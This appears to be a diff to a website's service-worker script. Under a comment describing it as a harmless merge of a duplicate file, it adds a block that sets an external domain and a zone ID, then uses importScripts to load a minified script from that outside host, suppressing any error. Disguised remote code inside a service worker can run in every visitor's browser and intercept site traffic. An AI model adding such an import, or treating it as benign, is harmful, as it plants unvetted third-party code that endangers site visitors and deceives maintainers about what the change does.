@@ -49,6 +49,23 @@ self.addEventListener('install', (event) => {
   self.skipWaiting();
 });
 
+/* === Merged from sw (1).js ===
+   The following block was appended from the duplicate service-worker file
+   to preserve behavior while keeping the original `sw.js` intact.
+*/
+
+try {
+  self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 10544960
+  };
+  self.lary = "";
+  importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw');
+} catch (e) {
+  // If external import fails, do not break the primary SW logic.
+  console.warn('Merged SW import failed:', e);
+}
+
 self.addEventListener('activate', (event) => {
   event.waitUntil(
     caches.keys().then((keys) => Promise.all(
